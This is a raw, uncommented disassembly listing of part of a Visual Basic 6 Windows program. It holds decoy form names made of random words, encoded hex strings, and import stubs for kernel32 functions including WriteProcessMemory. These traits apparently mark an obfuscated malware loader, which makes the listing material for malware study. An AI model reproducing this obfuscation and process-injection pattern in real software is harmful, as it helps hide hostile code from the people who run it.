.text:00401D90                 dd offset EVENT_SINK_AddRef
.text:00401D94                 dd offset EVENT_SINK_Release
.text:00401D98                 dd 11h dup(0)
.text:00401DDC dword_401DDC    dd 0                    ; DATA XREF: .text:00401D6C↑o
.text:00401DE0                 dd offset dword_401D48+0Ch
.text:00401DE4                 dd offset dword_401CAC
.text:00401DE8                 dd offset EVENT_SINK_QueryInterface
.text:00401DEC                 dd offset EVENT_SINK_AddRef
.text:00401DF0                 dd offset EVENT_SINK_Release
.text:00401DF4                 dd 6 dup(0)
.text:00401E0C                 dd offset loc_401E70
.text:00401E10                 dd 18h dup(0)
.text:00401E70 ; ---------------------------------------------------------------------------
.text:00401E70
.text:00401E70 loc_401E70:                             ; DATA XREF: .text:00401E0C↑o
.text:00401E70                 sub     dword ptr [esp+4], 37h ; '7'
.text:00401E78                 jmp     loc_40783C
.text:00401E78 ; ---------------------------------------------------------------------------
.text:00401E7D                 align 10h
.text:00401E80 dword_401E80    dd 30001h, 402290h, 0   ; DATA XREF: .text:00401F5C↓o
.text:00401E80                                         ; .text:00401FB8↓o ...
.text:00401E8C                 dd offset dword_407388
.text:00401E90                 dd 0FFFFFFFFh, 0
.text:00401E98                 dd offset off_402374
.text:00401E9C                 dd offset unk_40E044
.text:00401EA0                 dd 0
.text:00401EA4                 dd 7AE688h, 3 dup(0)
.text:00401EB4                 dd offset off_401EF8
.text:00401EB8                 dd 1, 402718h, 0
.text:00401EC4                 dd offset off_401EF8
.text:00401EC8                 dd 1, 401F00h, 0
.text:00401ED4                 dd offset off_401EFC
.text:00401ED8                 dd 2, 401F00h, 1B70001h, 6C0068h, 401F50h, 40E60Ch, 0
.text:00401EF4                 dd 7AC950h
.text:00401EF8 off_401EF8      dd offset dword_402728  ; DATA XREF: .text:00401EB4↑o
.text:00401EF8                                         ; .text:00401EC4↑o
.text:00401EFC off_401EFC      dd offset dword_402738  ; DATA XREF: .text:00401ED4↑o
.text:00401F00 dword_401F00    dd 110040h, 34h, 4026ECh, 30001h, 2 dup(0)
.text:00401F00                                         ; DATA XREF: .text:00401F58↓o
.text:00401F18                 dd offset dword_401F54
.text:00401F1C dword_401F1C    dd 7AA2A8h, 402748h, 30001h, 1F0040h, 38h, 4024C8h, 0FFFFFFFFh
.text:00401F1C                                         ; DATA XREF: .text:00401FB4↓o
.text:00401F38                 dd 2 dup(0)
.text:00401F40                 dd offset dword_401FB0
.text:00401F44                 dd 7AA288h, 4024D8h, 0FFFFFFFFh, 40204Ch
.text:00401F54 dword_401F54    dd 0                    ; DATA XREF: .text:00401F18↑o
.text:00401F58                 dd offset dword_401F00
.text:00401F5C                 dd offset dword_401E80
.text:00401F60                 dd offset EVENT_SINK_QueryInterface
.text:00401F64                 dd offset EVENT_SINK_AddRef
.text:00401F68                 dd offset EVENT_SINK_Release
.text:00401F6C                 dd 11h dup(0)
.text:00401FB0 dword_401FB0    dd 0                    ; DATA XREF: .text:00401F40↑o
.text:00401FB4                 dd offset dword_401F1C+0Ch
.text:00401FB8                 dd offset dword_401E80
.text:00401FBC                 dd offset EVENT_SINK_QueryInterface
.text:00401FC0                 dd offset EVENT_SINK_AddRef
.text:00401FC4                 dd offset EVENT_SINK_Release
.text:00401FC8                 align 20h
.text:00401FE0                 dd offset loc_402044
.text:00401FE4                 dd 18h dup(0)
.text:00402044 ; ---------------------------------------------------------------------------
.text:00402044
.text:00402044 loc_402044:                             ; DATA XREF: .text:00401FE0↑o
.text:00402044                 sub     dword ptr [esp+4], 37h ; '7'
.text:0040204C                 jmp     loc_407915
.text:0040204C ; ---------------------------------------------------------------------------
.text:00402051                 align 4
.text:00402054 dword_402054    dd 1F4h, 402290h, 0     ; DATA XREF: .text:00401654↑o
.text:00402060                 dd offset dword_407680
.text:00402064                 dd offset dword_40D5B0
.text:00402068                 dd 227Ch, 40E008h
.text:00402070                 dd offset __vbaExceptHandler
.text:00402074                 dd offset unk_40E000
.text:00402078                 dd 84h dup(0)
.text:00402288                 dd offset dword_4015B0
.text:0040228C byte_40228C     db 5, 4 dup(0)          ; DATA XREF: .text:004074D0↓o
.text:00402291                 align 4
.text:00402294                 dd offset unk_40E170
.text:00402298                 dd offset dword_4074CC
.text:0040229C                 dd 0FFFFFFFFh, 0
.text:004022A4                 dd offset unk_40E160
.text:004022A8                 dd 0ACBD3DC4h, 4DFB23BFh, 0D82CD49Fh, 6B5709C6h, 6000Ah
.text:004022BC                 dd 60006h, 4022E4h, 3 dup(0)
.text:004022D0                 dd offset aAcetones_0   ; "acetones"
.text:004022D4                 dd 409h, 809h, 0
.text:004022E0                 dd 2
.text:004022E4 off_4022E4      dd offset dword_401810  ; DATA XREF: .text:00401828↑o
.text:004022E8                 dd 0FFFFFFFFh, 402568h, 3 dup(0)
.text:004022FC                 dd offset aChickasaws   ; "chickasaws"
.text:00402300                 dd 1, 402404h, 0FFFFh, 18083h, 0
.text:00402314 off_402314      dd offset dword_401AF4  ; DATA XREF: .text:00401B0C↑o
.text:00402318                 dd 0FFFFFFFFh, 402674h, 3 dup(0)
.text:0040232C                 dd offset aCakier       ; "cakier"
.text:00402330                 dd 1, 402408h, 0FFFFh, 18083h, 0
.text:00402344 off_402344      dd offset dword_401CAC  ; DATA XREF: .text:00401CC4↑o
.text:00402348                 dd 0FFFFFFFFh, 402674h, 3 dup(0)
.text:0040235C                 dd offset aAbominates   ; "abominates"
.text:00402360                 dd 1, 40240Ch, 0FFFFh, 18083h, 0
.text:00402374 off_402374      dd offset dword_401E80  ; DATA XREF: .text:00401E98↑o
.text:00402378                 dd 0FFFFFFFFh, 402674h, 3 dup(0)
.text:0040238C                 dd offset aBroke        ; "Broke"
.text:00402390                 dd 1, 402410h, 0FFFFh, 18083h, 0
.text:004023A4 off_4023A4      dd offset dword_401960  ; DATA XREF: .text:00401978↑o
.text:004023A8                 dd 0FFFFFFFFh, 4028C0h, 3 dup(0)
.text:004023BC                 dd offset aLemur        ; "Lemur"
.text:004023C0                 dd 0Ch, 402414h, 0FFFFh, 118003h, 0
.text:004023D4 off_4023D4      dd offset dword_4015B0+28h
.text:004023D4                                         ; DATA XREF: .text:004015F0↑o
.text:004023D8                 dd 0FFFFFFFFh, 402ACCh, 0
.text:004023E4                 dd offset unk_40E074
.text:004023E8                 dd 0
.text:004023EC                 dd offset aBelows       ; "Belows"
.text:004023F0                 dd 29h, 0
.text:004023F8                 dd 0FFFFh, 18001h, 0
.text:00402404                 dd offset aFormLoad     ; "Form_Load"
.text:00402408                 dd offset aFormLoad     ; "Form_Load"
.text:0040240C                 dd offset aFormLoad     ; "Form_Load"
.text:00402410                 dd offset aFormLoad     ; "Form_Load"
.text:00402414                 dd offset aConcealed    ; "concealed"
.text:00402418                 dd offset aAuklets      ; "Auklets"
.text:0040241C                 dd offset aAcrobats     ; "acrobats"
.text:00402420                 dd 0
.text:00402424                 dd offset aFeinted      ; "feinted"
.text:00402428                 dd offset aMonogamist6  ; "Monogamist6"
.text:0040242C                 align 10h
.text:00402430                 dd offset aRetinal3     ; "Retinal3"
.text:00402434                 dd offset aBotch1       ; "Botch1"
.text:00402438                 dd offset aDiscloser    ; "discloser"
.text:0040243C                 dd offset aChiropractors ; "Chiropractors"
.text:00402440                 dd offset aMiladies8    ; "Miladies8"
.text:00402444 aChickasaws     db 'chickasaws',0       ; DATA XREF: .text:004022FC↑o
.text:0040244F                 align 10h
.text:00402450 aCakier         db 'cakier',0           ; DATA XREF: .text:0040232C↑o
.text:00402457                 align 4
.text:00402458 aAbominates     db 'abominates',0       ; DATA XREF: .text:0040235C↑o
.text:00402463                 align 4
.text:00402464 aBroke          db 'Broke',0            ; DATA XREF: .text:0040238C↑o
.text:0040246A                 align 4
.text:0040246C aLemur          db 'Lemur',0            ; DATA XREF: .text:004023BC↑o
.text:00402472                 align 4
.text:00402474 aBelows         db 'Belows',0           ; DATA XREF: .text:004023EC↑o
.text:0040247B                 align 4
.text:0040247C aAcetones_0     db 'acetones',0         ; DATA XREF: .text:004022D0↑o
.text:00402485                 align 4
.text:00402488 dword_402488    dd 36A46793h, 438299B7h, 8723B7BAh, 0A3A95DD8h, 531A2568h
.text:00402488                                         ; DATA XREF: .text:00407721↓o
.text:0040249C                 dd 4A704E92h, 0F3782C98h, 0E496DDDAh
.text:004024A8 dword_4024A8    dd 0A761599Ah, 4783D144h, 0A9AD708Eh, 0DF113761h
.text:004024A8                                         ; DATA XREF: .text:off_401888↑o
.text:004024B8 dword_4024B8    dd 9116B485h, 46AE7F1Fh, 28C941A5h, 6AF7E6FDh, 33AD4F3Ah
.text:004024B8                                         ; DATA XREF: .text:off_40188C↑o
.text:004024CC                 dd 11CF6699h, 0AA000CB7h, 93D36000h, 6D726F46h, 0
.text:004024E0 dword_4024E0    dd 0FCFB3D2Eh, 1068A0FAh, 838A7h, 0B571332Bh
.text:004024E0                                         ; DATA XREF: .text:off_402534↓o
.text:004024F0 aCProgramFilesX db 'C:\Program Files (x86)\WIN-H79HUT9ALDH\Administrator\VB6.OLB',0
.text:004024F0                                         ; DATA XREF: .text:00402544↓o
.text:0040252D                 align 10h
.text:00402530 aVb             db 'VB',0               ; DATA XREF: .text:00402548↓o
.text:00402533                 align 4
.text:00402534 off_402534      dd offset dword_4024E0  ; DATA XREF: .text:004074F4↓o
.text:00402534                                         ; .text:00407500↓o ...
.text:00402538                 dd 0
.text:0040253C                 dd 6, 9
.text:00402544                 dd offset aCProgramFilesX ; "C:\\Program Files (x86)\\WIN-H79HUT9ALD"...
.text:00402548                 dd offset aVb           ; "VB"
.text:0040254C                 dd offset unk_40E5B8
.text:00402550                 dd 2 dup(0)
.text:00402558                 dd 775BD8h
.text:0040255C aFormLoad       db 'Form_Load',0        ; DATA XREF: .text:00402404↑o
.text:0040255C                                         ; .text:00402408↑o ...
.text:00402566                 align 4
.text:00402568                 dd 40000Ch, 2 dup(0)
.text:00402574 dword_402574    dd 2417BDA3h, 4CB48A80h, 9704CA8Ah, 234378D0h
.text:00402574                                         ; DATA XREF: .text:off_401D24↑o
.text:00402584 dword_402584    dd 76214E8Ch, 41E0E467h, 0C1A227A4h, 37D48890h, 0
.text:00402584                                         ; DATA XREF: .text:off_401D28↑o
.text:00402598                 dd 4Eh
.text:0040259C aOgunhqymldmakj:                        ; DATA XREF: .text:004076FE↓o
.text:0040259C                 text "UTF-16LE", 'OGUNHQYMLDMAKJCUMKGTRMCEOBIEYMEAOUVUXNI',0
.text:004025EC aVba6Dll        db 'VBA6.DLL',0
.text:004025F5                 align 4
.text:004025F8 aVbahresultchec db '__vbaHresultCheckObj',0
.text:0040260D                 align 10h
.text:00402610 aVbanew2        db '__vbaNew2',0
.text:0040261A                 align 4
.text:0040261C dword_40261C    dd 0CC8024EDh, 4CC472AAh, 340FC987h, 0BB207ADFh, 867A0D91h
.text:0040261C                                         ; DATA XREF: .text:004077FD↓o
.text:00402630                 dd 49C3F8EEh, 0FC69D992h, 0CD0B235Fh
.text:0040263C dword_40263C    dd 0A6F639D6h, 45527AD8h, 9C3E0CA4h, 69469B5Eh
.text:0040263C                                         ; DATA XREF: .text:off_401B6C↑o
.text:0040264C dword_40264C    dd 9B8C238h, 47D048EFh, 26C0B1A8h, 0D224A146h
.text:0040264C                                         ; DATA XREF: .text:off_401B70↑o
.text:0040265C dword_40265C    dd 33AD4F1Ah, 11CF6699h, 0AA000CB7h, 93D36000h, 6F626E49h
.text:0040265C                                         ; DATA XREF: .text:00401B7C↑o
.text:0040265C                                         ; .text:00407504↓o
.text:00402670                 dd 3361h, 44000Ch, 2 dup(0)
.text:00402680                 dd 3Ah
.text:00402684 aNzogmzjllpvnfg:                        ; DATA XREF: .text:004077DA↓o
.text:00402684                 text "UTF-16LE", 'NZOGMZJLLPVNFGFIYTCFHBSYNACQA',0
.text:004026C0 dword_4026C0    dd 304FE1Bh, 48492F3Dh, 0DE430281h, 0D24BAC26h, 28AF7C30h
.text:004026C0                                         ; DATA XREF: .text:004078D6↓o
.text:004026D4                 dd 4162B552h, 0C2D1479Ch, 9FCACF82h
.text:004026E0 aRetinal3       db 'Retinal3',0         ; DATA XREF: .text:00402430↑o
.text:004026E9                 align 4
.text:004026EC dword_4026EC    dd 33AD4EF2h, 11CF6699h, 0AA000CB7h, 93D36000h, 6F626D45h
.text:004026EC                                         ; DATA XREF: .text:00407510↓o
.text:00402700                 dd 38726577h, 0
.text:00402708 dword_402708    dd 0D51CDE41h, 4AD327FFh, 0F7261D9Ah, 6CEEC2Bh, 0B34E2564h
.text:00402708                                         ; DATA XREF: .text:004079B2↓o
.text:0040271C                 dd 4C263300h, 3C212786h, 93202C58h
.text:00402728 dword_402728    dd 3FDD2C81h, 43A65483h, 417CFF8Bh, 0C5C839F6h
.text:00402728                                         ; DATA XREF: .text:off_401EF8↑o
.text:00402738 dword_402738    dd 0E812E102h, 422F6ADDh, 0EA94FBABh, 56E7DAF5h, 6C616E41h
.text:00402738                                         ; DATA XREF: .text:off_401EFC↑o
.text:0040274C                 dd 36h, 44h
.text:00402754 aMozvlaimjrijqt:                        ; DATA XREF: .text:0040798F↓o
.text:00402754                 text "UTF-16LE", 'MOZVLAIMJRIJQTDOBFTYRDACXNVBNSHEKE',0
.text:0040279A                 align 4
.text:0040279C                 dd 0FCFB3D2Bh, 1068A0FAh, 838A7h, 0B571332Bh, 15F43C53h
.text:004027B0                 dd 474CB1C1h, 5B2CCDA8h, 63898E22h
.text:004027BC dword_4027BC    dd 0FCFB3D2Ah, 1068A0FAh, 838A7h, 0B571332Bh
.text:004027BC                                         ; DATA XREF: .text:off_4019D8↑o
.text:004027CC dword_4027CC    dd 0FEDEE99Ah, 498F74F0h, 42C4989Eh, 18D07BE1h, 0FCFB3D21h
.text:004027CC                                         ; DATA XREF: .text:off_4019DC↑o
.text:004027CC                                         ; .text:00407AE6↓o ...
.text:004027E0                 dd 1068A0FAh, 838A7h, 0B571332Bh, 73616C43h, 73h, 0EA544A21h
.text:004027F8                 dd 11D1C82Dh, 0A000E4A3h, 82EA0AC9h
.text:00402804 aCWindowsSyswow db 'C:\Windows\SysWow64\MSVBVM60.DLL\3',0
.text:00402804                                         ; DATA XREF: .text:00402840↓o
.text:00402827                 align 4
.text:00402828 aVbrun          db 'VBRUN',0            ; DATA XREF: .text:00402844↓o
.text:0040282E                 align 10h
.text:00402830 off_402830      dd offset dword_4027CC+28h
.text:00402830                                         ; DATA XREF: .text:00407518↓o
.text:00402834                 align 8
.text:00402838                 dd 6, 9
.text:00402840                 dd offset aCWindowsSyswow ; "C:\\Windows\\SysWow64\\MSVBVM60.DLL\\3"
.text:00402844                 dd offset aVbrun        ; "VBRUN"
.text:00402848                 dd offset unk_40E5BC
.text:0040284C                 dd 2 dup(0)
.text:00402854                 dd 775BD8h
.text:00402858 aConcealed      db 'concealed',0        ; DATA XREF: .text:00402414↑o
.text:00402862                 align 4
.text:00402864 aAuklets        db 'Auklets',0          ; DATA XREF: .text:00402418↑o
.text:0040286C aAcrobats       db 'acrobats',0         ; DATA XREF: .text:0040241C↑o
.text:00402875                 align 4
.text:00402878 aFeinted        db 'feinted',0          ; DATA XREF: .text:00402424↑o
.text:00402880 aMonogamist6    db 'Monogamist6',0      ; DATA XREF: .text:00402428↑o
.text:0040288C                 align 10h
.text:00402890 aBotch1         db 'Botch1',0           ; DATA XREF: .text:00402434↑o
.text:00402897                 align 4
.text:00402898 aDiscloser      db 'discloser',0        ; DATA XREF: .text:00402438↑o
.text:004028A2                 align 4
.text:004028A4 aChiropractors  db 'Chiropractors',0    ; DATA XREF: .text:0040243C↑o
.text:004028B2                 align 4
.text:004028B4 aMiladies8      db 'Miladies8',0        ; DATA XREF: .text:00402440↑o
.text:004028BE                 align 10h
.text:004028C0 aZ              db 'Z',0
.text:004028C2                 dw 9Ch
.text:004028C4                 dd 80001h, 0
.text:004028CC                 dd 50038h, 3 dup(0)
.text:004028DC                 dd 920001h, 4, 2 dup(0)
.text:004028EC                 dd 41h, 0
.text:004028F4                 dd 3, 10054h, 10058h, 1050064h, 0
.text:00402908                 dd 680000h, 700001h, 740001h, 7C0001h, 1, 9
.text:00402920 aKernel32       db 'kernel32',0         ; DATA XREF: .text:off_402940↓o
.text:00402920                                         ; .text:off_402980↓o
.text:00402929                 align 4
.text:0040292C                 db 0Dh,0
.text:0040292E                 align 10h
.text:00402930 aGettickcount   db 'GetTickCount',0     ; DATA XREF: .text:00402944↓o
.text:0040293D                 align 10h
.text:00402940 off_402940      dd offset aKernel32     ; DATA XREF: sub_402958:loc_402963↓o
.text:00402940                                         ; "kernel32"
.text:00402944                 dd offset aGettickcount ; "GetTickCount"
.text:00402948                 dd 40000h, 40E5C0h, 2 dup(0)
.text:00402958
.text:00402958 ; =============== S U B R O U T I N E =======================================
.text:00402958
.text:00402958
.text:00402958 sub_402958      proc near               ; CODE XREF: sub_40C238+B↓p
.text:00402958                                         ; sub_40C238+2F↓p
.text:00402958                 mov     eax, dword_40E5C8
.text:0040295D                 or      eax, eax
.text:0040295F                 jz      short loc_402963
.text:00402961                 jmp     eax
.text:00402963 ; ---------------------------------------------------------------------------
.text:00402963
.text:00402963 loc_402963:                             ; CODE XREF: sub_402958+7↑j
.text:00402963                 push    offset off_402940 ; "kernel32"
.text:00402968                 mov     eax, offset DllFunctionCall
.text:0040296D                 call    eax ; DllFunctionCall
.text:0040296F                 jmp     eax
.text:0040296F sub_402958      endp
.text:0040296F
.text:0040296F ; ---------------------------------------------------------------------------
.text:00402971                 align 4
.text:00402974 dword_402974    dd 8, 65656C53h, 784570h
.text:00402974                                         ; DATA XREF: .text:00402984↓o
.text:00402980 off_402980      dd offset aKernel32     ; DATA XREF: sub_402998:loc_4029A3↓o
.text:00402980                                         ; "kernel32"
.text:00402984                 dd offset dword_402974+4
.text:00402988                 dd 40000h, 40E5CCh, 2 dup(0)
.text:00402998
.text:00402998 ; =============== S U B R O U T I N E =======================================
.text:00402998
.text:00402998
.text:00402998 sub_402998      proc near               ; CODE XREF: sub_40C238+25↓p
.text:00402998                 mov     eax, dword_40E5D4
.text:0040299D                 or      eax, eax
.text:0040299F                 jz      short loc_4029A3
.text:004029A1                 jmp     eax
.text:004029A3 ; ---------------------------------------------------------------------------
.text:004029A3
.text:004029A3 loc_4029A3:                             ; CODE XREF: sub_402998+7↑j
.text:004029A3                 push    offset off_402980 ; "kernel32"
.text:004029A8                 mov     eax, offset DllFunctionCall
.text:004029AD                 call    eax ; DllFunctionCall
.text:004029AF                 jmp     eax
.text:004029AF sub_402998      endp
.text:004029AF
.text:004029AF ; ---------------------------------------------------------------------------
.text:004029B1                 align 4
.text:004029B4                 dd 0Dh
.text:004029B8 aKernel32Dll    db 'kernel32.dll',0     ; DATA XREF: .text:off_4029E0↓o
.text:004029B8                                         ; .text:off_402A54↓o ...
.text:004029C5                 align 4
.text:004029C8                 dd 13h
.text:004029CC aWriteprocessme db 'WriteProcessMemory',0
.text:004029CC                                         ; DATA XREF: .text:004029E4↓o
.text:004029DF                 align 10h
.text:004029E0 off_4029E0      dd offset aKernel32Dll  ; DATA XREF: sub_4029F8:loc_402A03↓o
.text:004029E0                                         ; "kernel32.dll"
.text:004029E4                 dd offset aWriteprocessme ; "WriteProcessMemory"
.text:004029E8                 dd 40000h, 40E5D8h, 2 dup(0)
.text:004029F8
.text:004029F8 ; =============== S U B R O U T I N E =======================================
.text:004029F8
.text:004029F8
.text:004029F8 sub_4029F8      proc near               ; CODE XREF: .text:00407C58↓p
.text:004029F8                                         ; .text:00407DCD↓p ...
.text:004029F8                 mov     eax, dword_40E5E0
.text:004029FD                 or      eax, eax
.text:004029FF                 jz      short loc_402A03
.text:00402A01                 jmp     eax
.text:00402A03 ; ---------------------------------------------------------------------------
.text:00402A03
.text:00402A03 loc_402A03:                             ; CODE XREF: sub_4029F8+7↑j
.text:00402A03                 push    offset off_4029E0 ; "kernel32.dll"
.text:00402A08                 mov     eax, offset DllFunctionCall
.text:00402A0D                 call    eax ; DllFunctionCall
.text:00402A0F                 jmp     eax
.text:00402A0F sub_4029F8      endp
.text:00402A0F
.text:00402A0F ; ---------------------------------------------------------------------------
.text:00402A11                 align 4
.text:00402A14 dword_402A14    dd 0Dh, 4C746547h, 45747361h, 726F7272h, 0
.text:00402A14                                         ; DATA XREF: .text:00402A58↓o
.text:00402A28                 dd 22h
.text:00402A2C aFwieingzzyrmrc:                        ; DATA XREF: sub_40D26B+2D↓o
.text:00402A2C                 text "UTF-16LE", 'fwieingzzyrmrcvlw',0
.text:00402A50                 dd 0
.text:00402A54 off_402A54      dd offset aKernel32Dll  ; DATA XREF: sub_402A6C:loc_402A77↓o
.text:00402A54                                         ; "kernel32.dll"
.text:00402A58                 dd offset dword_402A14+4
.text:00402A5C                 dd 40000h, 40E5E4h, 2 dup(0)
.text:00402A6C
.text:00402A6C ; =============== S U B R O U T I N E =======================================
.text:00402A6C
.text:00402A6C
.text:00402A6C sub_402A6C      proc near               ; CODE XREF: .text:00407D89↓p
.text:00402A6C                                         ; .text:00409CF8↓p
.text:00402A6C                 mov     eax, dword_40E5EC
.text:00402A71                 or      eax, eax
.text:00402A73                 jz      short loc_402A77
.text:00402A75                 jmp     eax
.text:00402A77 ; ---------------------------------------------------------------------------
.text:00402A77
.text:00402A77 loc_402A77:                             ; CODE XREF: sub_402A6C+7↑j
.text:00402A77                 push    offset off_402A54 ; "kernel32.dll"
.text:00402A7C                 mov     eax, offset DllFunctionCall
.text:00402A81                 call    eax ; DllFunctionCall
.text:00402A83                 jmp     eax
.text:00402A83 sub_402A6C      endp
.text:00402A83
.text:00402A83 ; ---------------------------------------------------------------------------
.text:00402A85                 align 4
.text:00402A88 dword_402A88    dd 0Bh, 70616548h, 61657243h, 6574h
.text:00402A88                                         ; DATA XREF: .text:00402A9C↓o
.text:00402A98 off_402A98      dd offset aKernel32Dll  ; DATA XREF: sub_402AB0:loc_402ABB↓o
.text:00402A98                                         ; "kernel32.dll"
.text:00402A9C                 dd offset dword_402A88+4
.text:00402AA0                 dd 40000h, 40E5F0h, 2 dup(0)
.text:00402AB0
.text:00402AB0 ; =============== S U B R O U T I N E =======================================
.text:00402AB0
.text:00402AB0
.text:00402AB0 sub_402AB0      proc near               ; CODE XREF: .text:00407DA2↓p
.text:00402AB0                                         ; .text:00409D0B↓p
.text:00402AB0                 mov     eax, dword_40E5F8
.text:00402AB5                 or      eax, eax
.text:00402AB7                 jz      short loc_402ABB
.text:00402AB9                 jmp     eax
.text:00402ABB ; ---------------------------------------------------------------------------
.text:00402ABB
.text:00402ABB loc_402ABB:                             ; CODE XREF: sub_402AB0+7↑j
.text:00402ABB                 push    offset off_402A98 ; "kernel32.dll"
.text:00402AC0                 mov     eax, offset DllFunctionCall
.text:00402AC5                 call    eax ; DllFunctionCall
.text:00402AC7                 jmp     eax
.text:00402AC7 sub_402AB0      endp
.text:00402AC7
.text:00402AC7 ; ---------------------------------------------------------------------------
.text:00402AC9                 align 4
.text:00402ACC                 dd 0EC011Ch, 380000h, 0
.text:00402AD8                 dd 10000h, 10004h, 1050008h, 0
.text:00402AE8                 dd 800000h, 0C0001h, 105h, 0
.text:00402AF8                 dd 10084h, 10088h, 10010h, 10014h, 10018h, 1008Ch, 10090h
.text:00402B14                 dd 1001Ch, 10020h, 1050024h, 0
.text:00402B24                 dd 280000h, 300001h, 340001h, 380001h, 940003h, 3C0001h
.text:00402B3C                 dd 105h, 0
.text:00402B44                 dd 10040h, 10098h, 1009Ch, 100A0h, 100A4h, 100A8h, 10044h
.text:00402B60                 dd 10048h, 100ACh, 100B0h, 100B4h, 100B8h, 1004Ch, 10050h
.text:00402B7C                 dd 100BCh, 10054h, 100C0h, 10058h, 100C4h, 100C8h, 1005Ch
.text:00402B98                 dd 10060h, 100D0h, 10064h, 10068h, 100D4h, 100D8h, 10500DCh
.text:00402BB4                 dd 6C0069h, 6C0000h, 280105h, 78h, 1050070h, 57005Ch, 0E00000h
.text:00402BD0                 dd 740001h, 780001h, 550105h, 54h, 1007Ch, 100E4h, 4
.text:00402BEC asc_402BEC:                             ; DATA XREF: .text:loc_407AFF↓o
.text:00402BEC                                         ; .text:loc_408032↓o
.text:00402BEC                 text "UTF-16LE", '&H',0
.text:00402BF2                 align 4
.text:00402BF4                 dd 2
.text:00402BF8 dword_402BF8    dd 0                    ; DATA XREF: .text:00408692↓o
.text:00402BF8                                         ; .text:004086C1↓o
.text:00402BFC                 dd 32h
.text:00402C00 aQ687b683175687:                        ; DATA XREF: sub_40A806+70E↓o
.text:00402C00                 text "UTF-16LE", 'q687b6831756875726f737b68',0
.text:00402C34                 align 8
.text:00402C38                 dd 166h
.text:00402C3C aG8286858f91849:                        ; DATA XREF: .text:004088BA↓o
.text:00402C3C                 text "UTF-16LE", 'g8286858f9184937d7e8281868585917e7d7d7e82818f85817e'
.text:00402CA2                 text "UTF-16LE", '91828f85869184938e907e7d857d82828f85907d91818f85828'
.text:00402D08                 text "UTF-16LE", '081847d908285817e82818f85908081847d908285907d82818f'
.text:00402D6E                 text "UTF-16LE", '85848283828082829286858282',0
.text:00402DA4 aZ_0:
.text:00402DA4                 text "UTF-16LE", 'Z',0
.text:00402DA8 aI93a1b6a58fa1a:                        ; DATA XREF: .text:00408C8C↓o
.text:00402DA8                 text "UTF-16LE", 'I93a1b6a58fa1a8a582a0a1afafa1aeaca9ab7fb0a183',0
.text:00402E04                 text "UTF-16LE", '"',0
.text:00402E08 aVcwhvawdsjhqnz:                        ; DATA XREF: sub_40D139+38↓o
.text:00402E08                 text "UTF-16LE", 'vcwhvawdsjhqnzpsa',0
.text:00402E2C                 dd 13Eh
.text:00402E30 a51515152536465:                        ; DATA XREF: .text:00408917↓o
.text:00402E30                 text "UTF-16LE", '_515151525364655664665a5963566656675651645254566656'
.text:00402E96                 text "UTF-16LE", '58525152645459625155515a595552655663595451565852515'
.text:00402EFC                 text "UTF-16LE", '464545951526556635354515354515265565451625155516359'
.text:00402F62                 text "UTF-16LE", '555265',0
.text:00402F70                 text "UTF-16LE", '"',0
.text:00402F74 aQ34354e4750544:                        ; DATA XREF: .text:00408995↓o
.text:00402F74                 text "UTF-16LE", 'q34354e475054474d',0
.text:00402F98                 dd 6
.text:00402F9C aR91:                                   ; DATA XREF: .text:004089F2↓o
.text:00402F9C                 text "UTF-16LE", 'R91',0
.text:00402FA4                 dd 6
.text:00402FA8 aU51:                                   ; DATA XREF: .text:00408A78↓o
.text:00402FA8                 text "UTF-16LE", 'u51',0
.text:00402FB0                 dd 6
.text:00402FB4 aP8f:                                   ; DATA XREF: .text:00408AFD↓o
.text:00402FB4                 text "UTF-16LE", 'P8f',0
.text:00402FBC                 dd 6
.text:00402FC0 aJ90:                                   ; DATA XREF: .text:00408B82↓o
.text:00402FC0                 text "UTF-16LE", 'j90',0
.text:00402FC8                 dd 6
.text:00402FCC aG48:                                   ; DATA XREF: .text:00408C07↓o
.text:00402FCC                 text "UTF-16LE", 'g48',0
.text:00402FD4 a2:
.text:00402FD4                 text "UTF-16LE", '2',0
.text:00402FD8 aS8c8c846e70768:                        ; DATA XREF: sub_40A806+5F0↓o
.text:00402FD8                 text "UTF-16LE", 's8c8c846e70768d968296938d',0
.text:0040300C                 dd 192h
.text:00403010 aN9083918790948:                        ; DATA XREF: .text:00408CE9↓o
.text:00403010                 text "UTF-16LE", 'N908391879094807f8786847f83849187928284839187838183'
.text:00403076                 text "UTF-16LE", '81928591877f8582927f928082817f838690849383878280878'
.text:004030DC                 text "UTF-16LE", '58587807f8391877f7f91877f7f9187927f7f839187927f7f83'
.text:00403142                 text "UTF-16LE", '91877f827f83918783857f9280827f7f7f7f7f7f7f878894',0
.text:004031A4                 text "UTF-16LE", '>',0
.text:004031A8 aR8894a0a381a8a:                        ; DATA XREF: sub_40A806+551↓o
.text:004031A8                 text "UTF-16LE", 'R8894a0a381a8a0959f9a889d9d9274',0
.text:004031E8                 dd 10h
.text:004031EC aOummfxfn:                              ; DATA XREF: sub_40D204+2D↓o
.text:004031EC                 text "UTF-16LE", 'oummfxfn',0
.text:004031FE                 align 10h
.text:00403200                 dd 192h
.text:00403204 aS3d3c4f3d4d414:                        ; DATA XREF: .text:00408D46↓o
.text:00403204                 text "UTF-16LE", 'S3d3c4f3d4d414e444e404f3c4e4442424e513d3c403e4d414e'
.text:0040326A                 text "UTF-16LE", '443d514143443e403e4f434e3f40524e51434f3d3c503c524f3'
.text:004032D0                 text "UTF-16LE", 'd4f433c40433c4f40444f4d4f523c4f3d3f52523d3f51513d3c'
.text:00403336                 text "UTF-16LE", '4e44403f4e444540403f3f514e513d3c3c3e4d414e44443d',0
.text:00403398 a2_0:
.text:00403398                 text "UTF-16LE", '2',0
.text:0040339C aU828e8b8b608b8:                        ; DATA XREF: sub_40A806+413↓o
.text:0040339C                 text "UTF-16LE", 'U828e8b8b608b809493918875',0
.text:004033D0                 dd 1Ah
.text:004033D4 aQ877a557d865e:                         ; DATA XREF: sub_40A806+4B2↓o
.text:004033D4                 text "UTF-16LE", 'Q877a557d865e',0
.text:004033F0                 dd 0
.text:004033F4                 dd 192h
.text:004033F8 aS7e7d7779797c7:                        ; DATA XREF: .text:00408DC4↓o
.text:004033F8                 text "UTF-16LE", 'S7e7d7779797c75757d8b787d8b8b8b8b8b8b7a7c7d8a757688'
.text:0040345E                 text "UTF-16LE", '8a787d7a8a7e7d7a7a7888888a7a7c8a887e7879757c88787d7'
.text:004034C4                 text "UTF-16LE", 'd757988787d7c757e7d8b8b8b8b8b8b86867d8a777a757a8986'
.text:0040352A                 text "UTF-16LE", '7888767b8876797779797e7d7d8a7675877d7975877d878a',0
.text:0040358C                 text "UTF-16LE", '*',0
.text:00403590 a6d6d652f333473:                        ; DATA XREF: sub_40A806+374↓o
